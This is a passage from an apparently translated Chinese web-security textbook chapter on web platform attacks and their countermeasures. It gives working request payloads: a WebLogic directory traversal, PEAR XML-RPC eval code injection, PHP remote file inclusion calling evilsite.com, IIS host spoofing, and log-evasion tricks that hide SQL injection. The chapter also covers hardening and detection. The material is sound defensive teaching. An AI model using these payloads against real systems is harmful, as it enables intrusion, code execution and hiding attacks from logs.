GET /wl_management_internal2/wl_management HTTP/1.0
wl_request_type: wl_xml_entity_request
xml-registry-name: .../.../
xml-entity-path: config.xml

目录遍历问题只是这个 bug 的开始。如果你查看源代码，就会发现许多其他的函数也都没有受到保护。根据主机的操作系统和 WebLogic 的版本不同，你有可能很容易下载到

服务器上配置的所有应用程序的.war 文件，甚至上传你自己的文件。回到 T-Mobile 这个例子，攻击者就是利用该漏洞上传他自己的文件到 WebLogic 服务器的，并创建了几个后门，而且在他被捕前这几个后门已经被使用了一年多的时间了。

### ☑ BEA WebLogic 远程管理功能漏洞的对抗措施

该漏洞影响到以下的 WebLogic 版本:

所有平台上的 WebLogic Server and Express 6.0

☐ 所有平台上的 WebLogic Server and Express 6.1

☐ 所有平台上的 WebLogic Server and Express 7.0

☐ 所有平台上的 WebLogic Server and Express 8.1

BEA 在 2003 年 2 月发布了针对该问题的一个补丁。一个比较好的一般建议是更新 WebLogic 为最新的版本。你可以使用本章末尾的“参考和进一步阅读”一节中提供的链接来获得该问题更多的信息。

PEAR/PHP XML-RPC 代码执行

流行度：9
简单度：9
影响度：9
风险度：9

2005 年 7 月，在 PEAR/PHP XML-RPC 中发现了一个漏洞，该漏洞允许远程 PCP 代码执行。它造成了非常巨大的影响，因为很多流行的免费软件都使用 PEAR/PHP XML-RPC 作为它们的 Web 服务库，包括 PostNuke，Drupal，b2evolution 和 TikiWiki 等。事实上，在 2005 年 11 月，爆发了利用该漏洞进行攻击的蠕虫，这更说明了该漏洞的广泛性。由于杀毒软件厂商的不同，该蠕虫被命名为 Lupper 或者 Plupii。

该攻击的工作原理是，在 XML 解析引擎中有一个 eval()调用，嵌入到了来自外部 XML 请求的用户输入中。这使得攻击者可以构造一个简单的 XML 请求，嵌入闭合 eval()语句的攻击字符串，从而能够执行 PHP 代码。该攻击和 SQL 注入以及跨站脚本（XSS）的攻击方法属于同一类型，都是需要嵌入符合上下文代码的攻击字符串，以保证顺利地执行攻击代码。让我们更深入地研究一下该攻击是如何工作的。

在这个例子中, 我们讨论对一个使用 PHP XML-RPC 的 PhpAdsNew 漏洞版本的完整的攻击流程。PhpAdsNew 使用一个叫做 adxmlrpc.php 的文件来接受 Web 服务请求, 然后调用 XML-RPC 库来处理这些请求。接下来可以看到, 真正的攻击其实是非常简单的。攻击

包含在“name”字段里，包括用来闭合已存在的引号和传递来执行列举目录的 PHP 命令（如加粗的文本所示）。

注意 adxmlrpc.php 脚本只是一个通向 XML-RPC 库漏洞的入口。在其他漏洞应用程序的例子中，攻击代码体是相同的，只不过提交的脚本要改变成应用程序用来处理 XML 请求的脚本。

POST /phpAdsNew/adxmlrpc.php HTTP/1.0
Host: localhost
Content-Type: application/xml
User-Agent: Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)
Content-Length: 162
Connection: Close
<?xml version="1.0"?><methodCall><methodName>junkname</methodName><params><param><name>';passthru(dir);//</name><value>junk</value></methodCall>

漏洞服务器就会如同远程攻击者策划的那样，在响应中列出目录列表，

HTTP/1.1 200 OK
Connection: close
Content-Type: text/html
Cache-control: no-store, no-cache, must-revalidate, post-check=0, precheck=0
X-Powered-By: PHP/4.4.0
Server: Srv/4.0.0.4033

Volume in drive C has no label.
Volume Serial Number is 98C0-5EE5

Directory of C:\Apache\docs\phpAdsNew

11/11/2005 12:11 PM <DIR>
11/11/2005 12:11 PM <DIR>
01/13/2005 04:43 PM 6,166 adclick.php
03/14/2005 10:27 AM 3,280 adcontent.php
03/14/2005 10:12 AM 5,077 adframe.php
01/13/2005 04:43 PM 3,251 adimage.php
03/08/2005 12:14 AM 4,435 ads.php
01/13/2005 04:43 PM 6,250 adlayer.php
01/13/2005 04:43 PM 4,122 adlog.php
11/11/2005 12:11 PM <DIR>
01/13/2005 04:43 PM 8,618 adpopup.php
01/13/2005 04:43 PM 9,877 adview.php

10/09/2003 07:39 PM 73 adx.js
01/13/2005 04:43 PM 5,867 adxmlrpc.php
11/11/2005 12:11 PM <DIR> cache
11/11/2005 12:11 PM <DIR> client
11/10/2005 03:57 PM 6,706 config.inc.php
01/13/2005 04:43 PM 1,144 index.php
11/11/2005 12:11 PM <DIR> language
11/11/2005 12:11 PM <DIR> libraries
10/29/2002 10:01 PM 15,515 LICENSE
11/11/2005 12:11 PM <DIR> maintenance
11/11/2005 12:11 PM <DIR> misc
01/13/2005 04:43 PM 2,254 phpadsnew.inc.php
03/15/2005 11:20 AM 5,273 README
16 File(s) 87,908 bytes
9 Dir(s) 10,690,588,672 bytes free
<?xml version="1.0"?>
<methodResponse>
<fault>
<value>
<struct>
<member>
<name>faultCode</name>
<value><int>1</int></value>
</member>
<member>
<name>faultString</name>
<value><string>Unknown method</string></value>
</member>
</struct>
</value>
</fault>
</methodResponse>

就像上面的那样，该攻击非常简单、有效。我们可以检查代码，进一步查看攻击是如何发生的。该安全问题存在于随库加载的 lib-xmlrpcs.inc.php 文件的一段代码里。在 parseRequest()函数中有如下的代码：

// now add parameters in
$plist="";
for($i=0; $i<sizeof($_xh[$parser]['params']); $i++) {
    $plist."$i" . $_xh[$parser]['params'][$i]. " \n";
    eval('$m->addParam(' . $_xh[$parser]['params'][$i]. ");";
}

该函数取出 XML 请求中定义的每个参数，嵌入到 eval 函数中执行。加粗的文本部分是通过用户输入提供的参数名。因此，通过注入一个带有单引号的参数名来闭合前面的字符串，攻击者就可以执行他们的 PHP 代码。在这个例子中，我们仅仅传递参数名“‘);phpinfo();//”，代码看起来如下所示，这导致 phpinfo()函数被执行，而剩下的 PHP 代码被当成是注释。

Eval ('$m->addParam('');phpinfo();//");

#### ☐ PEAR/PHP XML-RPC 对抗措施

PHP.XML-RPC 和 PEAR XML-RPC 都发布了与它们的库对应的补丁版本，修补了上述漏洞。对于 PHP XML-RPC，更新到 1.2 或更高的版本，对于 PEAR XML-RPC，更新到 1.4.3 或更高的版本。获得这些补丁的位置在本章最后的“参考和进一步阅读”中列出。

### PHP 远程包含

流行度：7
简单度：6
影响度：9
风险度：6

2001 年，Shaun Clowes 发表了一篇名为 “攻击 PHP 应用中的常见漏洞——以 Scarlet 为例”的文章（“A Study In Scarlet: Exploiting Common Vulnerabilities in PHP Applications”）。该文章讨论了通过 URL 改写和定义 PHP 的变量的技巧。不过这篇文章的影响未被充分地认识到，因此直到几年后的今天，其中讨论的 PHP 问题仍然广泛存在。

这个漏洞的原理是怎样的呢？事实上非常简单，PHP 语言的一个重大特性就是可以自由地声明变量，而不需要初始化它们。这为开发者带来了很大的便利性，但同时也带来了一些严重的安全隐患。让我们举个例子看看该漏洞是如何被利用的。下面的 PHP 代码检查提交的密码是否正确匹配，如果匹配，就通过设置$aut 变量为 1 来给予访问权限。而在接下来的代码中，如果检查发现$aut 变量被正确设置了，那么登录者就可以进入站点中需要认证通过后才能进入的部分。

if ($password == "secret")
    // 如果密码正确，则允许访问
$auth = 1;
...
if ($auth == 1)
    // 允许用户登录

当一个用户登录时，发送给该脚本的数据是这样的：
http://www.site.com/login.php?password=secret&user=joe

注意 密码任何时候都不应该通过 URL 发送。这里只是出于演示的目的，不要在实际中模仿。

PHP 会自动地为该数据创建叫做$password 和$user 的变量，这两个变量可以在代码中随时被访问。这意味着代码中的任何变量都可以通过在 URL 中指定来赋值。当发送如下代码时，你认为代码会怎样运行呢？

##### http://www.site.com/login.php?password=junk&user=joe&auth=1

这行代码会设置$auth变量为正确的值1，从而绕过登录检查。可以看到，该安全问题有非常广泛的影响，也是导致许多PHP安全问题的原因。现在，由该问题产生的一个更大问题是，许多应用程序在它们的 include()语句中使用由变量组成的文件名，这将允许攻击者改写这些变量，指向他们自己的 PHP 代码并在系统上执行。

WebInsta 的例子 我们使用 WebInsta 邮件列表管理器作为例子，演示这个问题。WebInsta 邮件列表管理器是一个基于 PHP 的 COTS 产品，目的是为小型的商业机构和个人提供解决方案。一位安全顾问于 2005 年 3 月 10 日发表了关于该安全问题的详细信息。PHP 开发者采用的安全措施之一是将 .inc 文件重命名为 .inc.php。这样允许 PHP 处理器处理文件而不会由于未知的 .inc 扩展，而为外部用户转储出源代码。WebInsta 就是这样做的，但是其中的一个脚本 adodb.inc.php 含有未初始化的变量。这里显示的是摘录自文件开头的代码：

<?php
$connection=false;
if ($database == "none")
{
    ...
} else 
{
    include($absolute_path.'inc/adodb/adodb.inc.php');
}

如果我们可以控制$absolute_path 变量的值，那么就可以使它指向我们自己的 db.inc 文件执行 PHP 代码。由于我们看到$absolute_path 从未被定义过，因此知道可以利用它来实施攻击。输入一个 URL，在 URL 中定义一个变量，并让它指向我们 Web 站点上自己的 adodb.inc.php 文件，就可以进行攻击，构造如下所示。请注意，由于页面宽度的限制，我们插入了一个手动的换行符。

http://www.site.com:80/maillist/inc/initdb.php?absolute_path=http://www.evilsite.com/

然后在我们的 Web 站点上，创建 adodb.inc.php 文件：

<? passthru("dir");?>

$absolute_path 最终的值将是 http://www.evilsite.com/inc/adodb/adodb.inc.php, 这就会执行目录列举命令，如下所示：

GET /maillist/inc/initdb.php?absolute_path=http://www.evilsite.com/
HTTP/1.0
Host: www.site.com
User-Agent: Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)
HTTP/1.1 200 OK
Connection: close
Content-Type: text/html
Cache-control: no-store, no-cache, must-revalidate, post-check=0, precheck=0
X-Powered-By: PHP/4.4.0
Server: Srv/4.0.0.4033
Volume in drive C has no label.
Volume Serial Number is 98C0-5EE5
Directory of C:\Apache\Docs\maillist\inc
11/15/2005 01:41 PM <DIR>
11/15/2005 01:41 PM <DIR>
11/15/2005 01:41 PM <DIR>
11/19/2004 11:04 PM 125 config.php
05/07/2005 02:20 PM 438 email_email_sent.php
11/19/2004 11:04 PM 383 email_exist.php
04/23/2004 05:32 PM 376 email_not_exist.php
05/07/2005 08:39 PM 376 email_removed.php
01/10/2005 05:39 PM 421 email_thanks.php
05/07/2005 08:39 PM 576 functions.php
11/15/2005 01:42 PM 1,027 initdb.php
04/29/2004 06:45 PM 1,330 jscript.php
9 File(s) 5,052 bytes
3 Dir(s) 11,220,201,472 bytes free
<br />
<b>Fatal error</b>: Call to undefined function: adonewconnection() in
<b>C:\Apache\Docs\maillist\inc\initdb.php</b> on line <b>29</b><br />

### PHP 远程包含的对抗措施

由于远程包含已经成为一个巨大的安全问题，因此 PHP 引入了一个叫做 register_globals 的设置。关闭该设置会禁止通过 HTTP 请求来定义变量的功能，从而能够有效地阻止此类攻击。在 PHP 4.2.0 中，register_globals 默认是关闭的，但这并不意味着现今运行的 PHP 应用程序就没有此类安全问题，因为很多应用程序需要打开 register_globals，每个程序要自己实现针对该问题的安全过滤。如你所知，这就意味着仍有大量的 PHP 应用程序非常容易受到攻击。

注意 查看本章的 “Web 平台安全最佳实践” 部分，可以获得加固 PHP 的一些技巧。

IIS 5.x 和 IIS 6.0 服务器名远程欺骗

流行度：3
简单度：3
影响度：3
风险度：3

虽然进一步地研究会发现该漏洞的影响非常大，但大多数人仍没有意识到该漏洞。该问题最初的公布是演示攻击者如何访问到部分 ASP 代码，但深入研究后，发现该攻击还可以在编写不严谨的程序中欺骗主机名。让我们进一步看看这到底是如何实现的。

当用 ASP 或 .NET 开发一个 Web 应用程序, 开发者需要获得应用程序所在服务器 IP 地址的时候, 问题就会出现。很多开发者会使用下面的一种调用方式来获得程序所运行服务器的 IP 地址或主机名:

Request.ServerVariables("SERVER_NAME") (ASP)
Request.ServerVariables["SERVER_NAME"] (.NET)

这些调用会返回局部环境变量中“SERVER_NAME”的值，如果该请求来自 Internet，这个值通常是 Web 服务器的 IP 地址。如果请求就是来自 Web 服务器，该变量的值是“localhost”。该操作的总结如表 3-1 所示。

 </div>

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>请求的来源</td><td style='text-align: center; word-wrap: break-word;'>SERVER_NAME 变量的值</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Web 客户端</td><td style='text-align: center; word-wrap: break-word;'>www.site.com</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Web 服务器端</td><td style='text-align: center; word-wrap: break-word;'>localhost</td></tr></table>

开发者经常使用该函数来检查请求是否来自本地，如果来自本地，则会启用一些受限功能。比如，开发者可以使用该方法来阻止非本地请求对管理员页面的访问。

该漏洞是由于微软使用这种方法来处理他们的错误文件而造成的。默认情况下，所有的 IIS 安装都有 IISHelp 目录，里面包含了默认的 IIS 错误信息。500～100 错误代码默认指向 “/iishelp/ common/500-100.asp” 页面。因此，对于 IIS 服务器产生的所有 500 错误，IIS 都会使用该页面作为模板，把响应回显给用户。该响应对 VBScript 错误和数据库错误是很常见的。

微软 IIS 5.x 上 500-100.asp 页面的代码使用 Request.ServerVariables("SERVER_NAME") API 来确定错误是否显示给本地用户，如果显示给本地用户，则错误页面将转储出错误发生具体位置的源代码。而如果客户端不是本地的，就只显示一个一般的错误页面，如图 3-4 所示。

 </div>

这里的漏洞是因为“SERVER_NAME”变量是可以被改写的，改写此变量的值可以通过在 Host:header 或 URL——Get http://spoof/ file.asp 中指定一个值实现。例如，用如下的请求可以冒充是本地主机：

GET http://localhost/product_detail.asp?id=a HTTP/1.0
Host: 192.168.1.1

这样我们就会接收到如下的响应：

Technical Information (for support personnel)

Error Type:
Microsoft VBScript compilation (0x800A03F2)
Expected identifier
/product_detail.asp, line 27, column 3
dim
---

请注意，这一次我们接收到的源代码还伴随着错误信息。就其本身来说，这并不是很重要。我们关注该问题是因为该漏洞的离奇和潜在隐患。它并不是缓冲区溢出攻击或者路径遍历攻击，但如果你进一步考虑该漏洞可能带来的影响，会发现它是非常不寻常的。在多主机情况下，开发者使用该变量来限制访问特定的站点。事实上，最近我们有机会可以充分利用该问题，我们发现如果冒充成本地主机，就会被带到开发者管理页面，该页面允许我们查看所有关于 Web 站点的调试信息。开发者们，多谢了！

这种欺骗攻击使我们想起了另一个与之密切相关的常见开发问题。当使用 ASP 和 .NET 时，许多开发者会使用类似下面的调用获得用户的输入：

Username = Request["username"]

让我们进一步研究一下。确定用户是来自本地还是特定 IP 地址的正确方法，就是检查“REMOTE_ADDR”服务器变量，它会告诉你客户端的 IP 地址。这就是为何开发者会在代码中添加下面这行代码的原因，

if (Request["REMOTE_ADDR"] == "127.0.0.1")

如果验证成功，就会给用户发送管理页面。该代码可行是由于它会提供服务器变量的正确值。但是如果你再想想，也很容易发现用户可以通过在 URL 中指定值来绕过检查，像下面这样：

##### http://www.site.com/auth.aspx?REMOTE_ADDR=127.0.0.1

该方法之所以有效，是由处理用户输入的方式决定的。查找 REMOTE_ADDR 的顺序是先在查询集查找，然后是提交的数据，再是 Cookie，最后才是服务器变量。因为变量检查的顺序以查询集开始，因此该检查就成功通过，并把攻击者直接带到管理页面。可以看到，易受到该类型攻击的站点数目是相当惊人的。

### ☐ IIS 5.x 和 IIS 6.0 远程服务名欺骗的对抗措施

针对该问题采取的对策是不要使用 “SERVER_NAME” 变量来做任何主机名或 IP 地址类的验证。相反，可以使用 “REMOTE_ADDR”，不过方法要正确：

Request.ServerVariables["REMOTE_ADDR"]

这行代码会正确和安全地提取出客户端的远程地址。访问服务器变量时，总是使用Request.ServerVariables[]是一个很好的措施。

### 3.3 检测绕过技术

不是所有的 Web 平台问题都会必然导致直接的攻击。日志绕过就是一个很好的例子，这种 Web 平台漏洞不是建立闯入 Web 服务器的直接途径，却可以干扰系统检测出攻击者。接下来，我们将给出两个例子，在例子中，攻击者可以绕过对他们请求的正确记录。

#### 使用超长 URL 绕过日志记录

流行度：3
简单度：1
影响度：5
风险度：3

一些 Web 服务器软件不能正确地记录字符超过一定长度的 URI 数据。比如，Sun-One 应用程序服务器只能记录请求 URI 的前 4042 个字符；当请求字符串或者头部中的字符超过 4097 个时，微软的 IIS 也有同样的问题。这样做的目的是为了避免攻击者用 DoS 攻击填满日志，但是攻击者也可以利用该特性来实现他们自己的利益。让我们仔细地看看 IIS 的例子，解释攻击者如何利用该特性在 Web 日志中掩盖他们的存在。

当写入 Web 日志时, 如果长度超过了 4097 个字符, IIS 会自动截断查询字符串为“...”。这使得攻击者可以伪造一个查询, 填满 4097 个字符并在末尾附上攻击代码。Web 服务器仍会正确处理请求, 丢弃掉伪造的参数, 使得攻击可以成功而该请求又不会被记录。

让我们看一个具体的例子，该例使用日志绕过技术，隐藏针对 IIS 的 SQL 注入攻击。如果 SQL 注入是通过查询字符串执行攻击的，那么很容易被 Web 日志发现，如下面这个例子所示。

GET /article.asp?id=convert(int, (select+top+1+name+from+sysobjects+where+xtype='u')) HTTP/1.0
Connection: Close
Host: www.site.com
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322)

Web 服务器正常响应，日志项如下所示：

2005-10-04 22:10:24 127.0.0.1 - 127.0.0.1 80 GET /product_detail.asp
id=convert(int, (select+top+1+name+from+sysobjects+where+xtype='u')) |
170|80040e07
| [Microsoft] [ODBC_SQL_Server_Driver] [SQL_Server] Syntax_error_
converting_the_nvar
char_value_'tbl_Globals'_to_a_column_of_data_type_int. 500 4910 561
Mozilla/5.0+ (Windows; +U; +Windows+NT+5.1; +enUS; +rv:1.7.10) +Gecko/
20050716+Firefox/1.0.6

我们可以从加粗的文本中清楚地看到：发生了 SQL 注入攻击，并且在响应中返回了数据库错误。在这种情况下，很容易发现是否有人试图对程序进行 SQL 注入，只要分析 IIS 日志，查找有没有返回给用户的 SQL 数据库错误信息，或者查找请求中使用的 SQL 关键字即可。

让我们看看同样的请求，它隐藏在一个超长的 URL 中，用来绕过 IIS 日志的检测。我们使用同样的攻击请求，不过加入了伪造的 “foo” 参数来填充日志缓冲区：

GET /product_detail.asp?id=convert(int, (select+top+1+name+from+sysobjects+where+xtyp
e='u'))&foo=<4097 a's> HTTP/1.0
Host: localhost
User-Agent: Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)

因为 “foo” 参数是伪造的，Web 应用程序会忽略它而使攻击成功执行。日志文件记录下了如下的请求：

2005-10-04 22:31:01 127.0.0.1 - 127.0.0.1 80 GET /product_detail.asp ...
500 4965 4287 Mozilla/4.0+ (compatible; +MSIE+5.01; +Windows+NT+5.0) - -

注意，查询字符串现在被替换成了“...”，而且也没有记录下响应的错误文本。攻击者可以用任何类似的参数进行处理，而不会留下任何记录。

#### 使用 TRACK 隐藏请求

流行度：3
简单度：1
影响度：5
风险度：3

TRACK 是一种 HTTP 方法, 只有 IIS 支持, 其功能和 TRACE 方法完全相同。对 TRACK 请求的响应是重复所发的请求。举个例子:

TRACK / HTTP/1.1

Host: www.site.com
User-Agent: Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)
HTTP/1.1 200 OK
Server: Microsoft-IIS/5.x
Date: Tue, 04 Oct 2005 23:07:12 GMT
X-Powered-By: ASP.NET
Content-Type: message/http
Content-Length: 102
TRACK / HTTP/1.1
Host: www.site.com
User-Agent: Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)

在微软 IIS 5.x 中，所有的 TRACK 请求都不会被 Web 服务器记录。该请求本身并不具危险性，不能用来获得页面或者提交攻击，但可以用做 DoS 攻击。

我们最近调查客户的 Web 服务器上的异常行为时亲身体验了 TRACK 的使用。那时 CPU 占用率很高，机器响应很慢。当在网络上放置了嗅探器后，我们发现虽然 HTTP 流量非常高，但是许多嗅探器看到的请求 Web 日志中都没有记录。在使用嗅探器进一步查看 Web 请求后，我们发现有很多 TRACK / <long URL> HTTP/1.0 请求发给了服务器，但这些请求没有被日志记录下来。

注意 TRACK 请求同样是一个不会留下日志痕迹而进行 DoS 攻击 Web 服务器的好方法，关于 DoS 攻击的更多内容请查看第 12 章。

#### ☐ IIS 日志绕过技术的对抗措施

使用 URLScan 预防这些问题是一个很好的解决方案。默认情况下，安装 URLScan 时，有一个设置是 MaxQueryString=2048，这会有效地阻止各种超长 URL 绕过方法。在 URLScan 2.5 中，有一个叫做 LogLongUrls 的选项。通过打开该选项，URLScan 可以记录长达 128 Kb 的请求，从而使得日志中可以看到所有的攻击。URLScan 也可以用来拒绝像 TRACK 或 TRACE 这样的方法。通常的经验是拒绝除了 HEAD，GET 和 POST 之外的所有请求方法。

提示 更多关于 URLScan 的信息可以在附录 C 中找到。

### 3.4 Web 平台安全最佳实践

在本章中，我们已经讨论了很多 Web 平台攻击技术和对抗措施，但是我们得承认，列

94

举可能攻陷 Web 平台的全部技术类别是不可能的。本节全面总结了加固 Web 平台的重要建议，也给出了针对 IIS，Apache 和 PHP 这些本书编写时主流 Web 平台的具体措施。当在线环境中配置了这些技术时，你就可以确信自己已经到达安全基准了。

提示 也可以查看附录 A 中我们总结的 Web 安全检查列表。

#### 3.4.1 通用最佳实践

下面列出的建议适用于所有 Web 平台，无论它是现成的还是自定制的。

#### 执行严格的双向网络访问控制

我们认为在因特网的现今阶段，就不用再强调对 Web 服务器的入站通信进行严格防火墙过滤的必要性了。TCP 端口 80（如果你实现了 SSL/TLS，还有 443 端口）应该是一般访问者在入站时唯一可以访问的端口（显然，特定的用户通信，比如内容管理，服务器管理等，可能需要访问其他特殊的端口）。

虽然入站的过滤被广泛应用，但我们经常看到的一个错误是忽略了对出站的访问控制。一旦攻击者获得了在 Web 服务器上运行任意命令的权限，他首先要做的事情是得到一个出站 Shell，或者创建出站的连接来上传更多的文件到受害机上。在 Web 服务器前端防火墙上，进行正确的出站过滤，可以阻止这些请求，从而从根本上阻止攻击者。最简单的规则是保留已经建立的连接，拒绝所有其他的出站连接，这可以通过保留有 TCP SYN 标志的包而阻止其他包来实现。这样不会阻止对合法请求的响应，服务器仍然可以被外部访问到（你的入站过滤器也是很严格的，对吧？）

请注意很重要的一点是，老练的攻击者可能会劫持合法的出站连接，来绕过出站过滤。但是，依据我们的经验，在实际中是很难做到的。严格的出站访问控制，是你可以为 Web 服务器建立的重要防范层。

##### 及时更新安全补丁

保持 Web 平台强健和安全的最有效方法，是随时保持系统更新最新的安全补丁。你必须不断地为你的平台和应用程序打上补丁，没有什么捷径可言。虽然这里还有很多其他的步骤可以用来加固你的系统以避免攻击，但是就像宣传的那样，及时更新系统的安全设置是你能做的最重要的事情。我们建议使用自动升级工具，比如微软更新服务，来帮助你保证获取最新的补丁。对于 Apache 来说，只需订阅 Apache 公告列表，就可以在新版本发布的时候得到通知，从而进行更新（其链接请查看本章末尾的“参考和进一步阅读”一节）。

##### 不要在源代码中放置私密信息

如果教导你的开发团队不犯此类错误，你就不用太担心最新、最严重的源代码泄漏会传遍黑客圈。这一类常见的错误包括：

- 在 ASP 脚本中用明文 SQL 连接字符串 使用 SQL 集成安全或一个二进制的 COM 对象来代替。

o 在应用配置文件中使用明文密码 在诸如 global.asa 或 web.config 应用程序配置文件中，永远不要使用明文密码。

- 使用以.inc 为扩展名的包含文件 把它们改名为.asp，并在其他脚本中改变对应的内部引用（或者像本章前面描述的那样，把.inc 映射到 ASP 扩展）。

在脚本中的注释中包含诸如 E-mail 地址、目录结构信息和密码等私密信息 不要把你自己放到如此高危的环境中，确认删除了会对自己不利的 Web 平台信息和应用程序信息。

##### 定期为易受到攻击的服务器进行网络扫描

防范攻击的最佳机制是定期进行漏洞扫描。这里有很多非常有效的检测 Web 应用程序的产品，比如 SPI Dynamics 的 WebInspect，Watchfire 的 AppScan。对于识别 Web 平台漏洞和应用层漏洞，它们都非常棒。

提示 关于自动化 Web 安全评估工具的评测，请查看第 13 章。

##### 能判断自己是否受到了攻击

应急响应措施就像防范措施一样重要，对于易受攻击的 Web 服务器来说更是如此。为了确认你的服务器是否已经成为了目录遍历攻击的受害者，我们推荐如下指定的调查行动，这包括了如下的经典技术。

在受到攻击的 Web 服务器上使用 Netstat 程序，是确认任何连到 Web 服务器高端口的陌生入站连接的好办法。就像我们已经看到的那样，在漏洞被利用之后，可能随后有连接到流氓 Shell 实例。但是，要把出站连接和 Web 客户端的合法连接区分开有点困难。

提示 在 WindowsXP 之后（包括 XP）的版本，netstat 命令做了修改，可以用-o 选项显示使用 TCP/IP 端口的程序。

另一个不错的调查切入点是文件系统。大量现成的攻击代码在因特网上流传。那里有很多与攻击相关的文件，它们最初是由很严肃的安全研究人员发布的，却常常被脚本小子完全重用。举个例子来说，在 IIS 上，诸如 Sensepost.exe, Upload.asp, Upload.inc 和 Cmdasp.asp

等文件都是常见的系统后门。虽然只是简单地重命名，但至少可以防范脚本小子的攻击。特别要注意诸如 IIS 的/script 这类可写/可执行文件夹下的文件。另一种常见的情况是，IIS 攻击代码常常带有 root.exe（重命名后的命令行 shell），e.asp，dl.exe，reggina.exe，regit.exe，restsec.exe，makeini.exe，newgina.dll，firedaemon.exe，mmtask.exe，sud.exe 和 sud.bak 等文件。一定要留心它们！

最后，也可能是最显眼的，首先显示未授权行为的地方常常是 Web 服务器日志（在本章的前面，我们已经讨论过日志绕过技术）。下面，我们举一个简单的例子，说明如何发现 Code Red 和 Nimda 蠕虫对服务器的访问。2001 年末到 2002 年，Code Red 和 Nimda 蠕虫在 Internet 上横行，它们感染带有缓冲区溢出漏洞的服务器，植入代码，然后继续感染其他的服务器。在 Code Red 感染的服务器上，Web 服务器日志包含了像下面这样的项：

GET /default.ida?

Code Red 和 Nimda 也会在受攻击的系统上留下很多文件。出现 %systemdrive %\\notworm 目录是服务器已经被 Code Red 攻击的明显标记。如果存在已被重命名的叫做 root.exe 的 Windows 命令行 shell，那也是 Nimda 曾访问过机器的标记。

我们明白，即使在一个规模不大的 Web 服务器上定期监视日志和文件系统，都需要很大的精力。但是，我们希望一旦发现服务器已经受到攻击，这些提示可以帮助你。

### 3.4.2 IIS 加固

下面是我们用来加固 IIS 以对抗常见攻击的首选技术:

☐ 关闭错误详细信息，它会带给潜在攻击者太多的信息。

☐ 恰当地放置 Web 目录。

☐ 删除不使用的扩展映射。

☐ 使用文件系统访问控制列表。

我们接下来讨论关于这些技术的细节，然后其他的一些技术将在下一节中讨论。

##### 关闭 IIS 错误详细信息

详细的错误信息绝不应该在你的产品服务器上保留。它们只会为攻击者提供更多的信息，从而用来对付你。下面是如何在 IIS 管理器中禁止它们的操作步骤：

1. 在目标 Web 站点的属性上右击；

2. 选择“主目录”标签；

3. 单击“配置”按钮；

4. 选择“应用程序调试”标签；

5. 在 “脚本错误消息” 下面，选择单选按钮为 “发送文本错误消息给客户”。

##### 不要在系统驱动器下安装你的 Web 目录

在过去，目录遍历攻击在 IIS 平台上是很常见的（查看“参考和进一步阅读”一节获得以前的相关报道）。直到现在，该类型的攻击都受到 URL 语法的限制，不允许跳转卷号。因此，把 IIS Web 根目录移动到一个没有诸如 cmd.exe 等强大工具的盘符下，这类攻击就变得不可行了。在 IIS 上，“Internet 服务管理器”（iis.msc）控制着 Web 根目录的物理位置。选择“默认 Web 站点属性”，选择“主目录”标签，将“本地路径设置”改为非%systemroot%的驱动器。

当你重定位你的 Web 根目录到一个新的驱动器时，请确定执行了完整的 NTFS ACL。如果没有，ACL 会在目标驱动器中设置成默认的 “Everyone: 完全控制”！Windows Server Resource Kit 中的 Robocopy 是一个便利的工具，可以原封不动地移动 Windows 文件以及 ACL 所在的文件夹，Robocopy /SEC 选项是可以考虑的相关参数。

##### 删除未使用的扩展映射

这些年来，有很多围绕着 IIS 扩展（即 ISAPI DLL）的安全问题，其中包括.printer 缓冲区溢出和+.htr 源代码泄漏漏洞。所有的这些漏洞都处于 ISAPI DLL 中，需要通过删除特定的 DLL 应用映射来禁止它们，也可以选择删除真实的.dll 文件。当删除应用映射后，DLL 不会在 IIS 启动流程中被加载，因此漏洞就不能被利用了。

提示 因为很多安全问题都和 ISAPI DLL 映射有关，因此这是增强 IIS 安全性时，需执行的最重要的对抗措施之一。

为了解除文件扩展的 DLL 映射，在你要管理的电脑上单击右键，选择 “属性”，然后会出现下面这些项目：

☐ 管理工具

○ WWW 服务

☐ 编辑

☐ 默认 Web 站点属性

☐ 主目录

☐ 应用程序设置

☐ 配置

☐ 应用程序映射

在最终出现的屏幕上，删除要删的 ISAPI 扩展映射（在 IIS 5 上，.printer 映射到图 3-5 中选中的 msw3prt.dll 上）。

 </div>

其他一些 ISAPI DLL 也有严重的安全漏洞。表 3-2 列出了其他的漏洞，以及应该解除映射的关联 DLL。

 </div>

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>如果你不需要</td><td style='text-align: center; word-wrap: break-word;'>解除该扩展的映射</td><td style='text-align: center; word-wrap: break-word;'>过去的相关漏洞</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>活动服务器页面功能</td><td style='text-align: center; word-wrap: break-word;'>.asp</td><td style='text-align: center; word-wrap: break-word;'>缓冲区溢出，MS02-018</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>基于 Web 的密码重置</td><td style='text-align: center; word-wrap: break-word;'>.htr</td><td style='text-align: center; word-wrap: break-word;'>+.htr 源代码泄漏，MS01-004</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>因特网数据库连接</td><td style='text-align: center; word-wrap: break-word;'>.idc</td><td style='text-align: center; word-wrap: break-word;'>泄漏 Web 目录路径，Q193689</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>服务器端包含</td><td style='text-align: center; word-wrap: break-word;'>.stm, .shtml, .shtml</td><td style='text-align: center; word-wrap: break-word;'>远程系统缓冲区溢出，MS01-044</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>因特网打印</td><td style='text-align: center; word-wrap: break-word;'>.printer</td><td style='text-align: center; word-wrap: break-word;'>远程系统缓冲区溢出，MS01-023</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>检索服务器</td><td style='text-align: center; word-wrap: break-word;'>.ida, .idq</td><td style='text-align: center; word-wrap: break-word;'>远程系统缓冲区溢出，MS01-033</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>点击命中率</td><td style='text-align: center; 